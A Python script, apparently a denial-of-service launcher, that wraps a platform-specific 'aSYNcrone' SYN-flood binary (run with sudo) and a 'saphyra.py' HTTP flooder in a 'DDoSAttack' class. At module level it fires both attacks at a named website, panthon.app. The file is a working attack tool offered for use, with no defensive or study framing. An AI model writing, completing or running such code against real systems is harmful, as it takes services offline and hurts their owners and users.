import logging
import os
import subprocess
import sys
import platform
from urllib.parse import urlparse
import socket


logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)


class DDoSAttack:
    def __init__(self):
        self.threads = []

    def aSYNcrone_attack(self, target_url, target_port, num_connections):
        platform_type = self.detect_platform()

        if platform_type:
            parsed_url = urlparse(target_url)
            hostname = parsed_url.netloc
            ip = socket.gethostbyname(hostname)
            command = [
                "sudo",
                platform_type,
                "80",
                ip,
                str(target_port),
                str(num_connections),
            ]
            try:
                subprocess.run(command)
            except subprocess.CalledProcessError as e:
                logging.error(f"Error while running aSYNcrone: {e}")
                return

    def saphyra_attack(self, target_url):
        command = [
            "python3",
            os.path.join(os.path.dirname(__file__), "saphyra.py"),
            target_url,
        ]
        try:
            subprocess.run(command)
        except subprocess.CalledProcessError as e:
            logging.error(f"Error while running saphyra: {e}")
            return

    def detect_platform(self):
        if sys.platform == "darwin" and platform.machine() == "arm64":
            return os.path.join(os.path.dirname(__file__), "aSYNcrone/aSYNcronemacARM")
        elif sys.platform == "darwin":
            return os.path.join(os.path.dirname(__file__), "aSYNcrone/aSYNcronemac")
        elif sys.platform == "linux":
            return os.path.join(os.path.dirname(__file__), "aSYNcrone/aSYNcrone")
        else:
            logging.error(f"Unknown platform: {sys.platform}")
            return None


# Create DDoSAttack object
attack = DDoSAttack()

# aSYNcrone attack parameters
target_url_async = "https://panthon.app"
target_port_async = 80
num_connections_async = 1

# Saphyra attack parameters
target_url_saphyra = "https://panthon.app"

# Launch attacks
attack.aSYNcrone_attack(target_url_async, target_port_async, num_connections_async)
attack.saphyra_attack(target_url_saphyra)
